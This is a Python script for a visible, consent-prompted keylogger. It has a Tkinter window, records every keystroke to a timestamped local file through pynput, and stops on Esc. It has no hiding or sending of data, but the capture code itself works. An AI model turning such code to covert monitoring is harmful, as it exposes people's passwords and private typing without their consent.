import os
import datetime
import tkinter as tk
from tkinter import messagebox
from pynput import keyboard

def get_log_filename():
    """Generates a unique log file name based on the current date and time."""
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    return f"keylogged_at_{timestamp}.txt"

def start_keylogger():
    """Starts keylogging if the user confirms via the GUI."""
    global log_file
    response = messagebox.askyesno("Confirmation", "Do you want to start keylogging?")
    
    if response:
        log_file = get_log_filename()
        messagebox.showinfo("Keylogger", "Keylogging started!\nPress 'Esc' to stop.")
        
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    else:
        messagebox.showinfo("Keylogger", "Keylogging aborted.")
        root.destroy()  # Close the GUI

def on_press(key):
    """Handles key press events and logs them to a file."""
    try:
        with open(log_file, "a") as f:
            if hasattr(key, 'char') and key.char:
                f.write(key.char)  # Logs normal keys
            else:
                f.write(f"[{key}]")  # Logs special keys
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    """Stops logging when the Escape key is pressed."""
    if key == keyboard.Key.esc:
        messagebox.showinfo("Keylogger", f"Keylogging stopped.\nLogs saved to: {log_file}")
        root.quit()  # Stop the Tkinter event loop
        return False  # Stops the key listener

# Create GUI
root = tk.Tk()
root.title("Keylogger")
root.geometry("300x150")
root.resizable(False, False)

label = tk.Label(root, text="Start Keylogger?", font=("Arial", 12))
label.pack(pady=10)

start_button = tk.Button(root, text="Start", command=start_keylogger, font=("Arial", 10))
start_button.pack(pady=5)

exit_button = tk.Button(root, text="Exit", command=root.quit, font=("Arial", 10))
exit_button.pack(pady=5)

root.mainloop()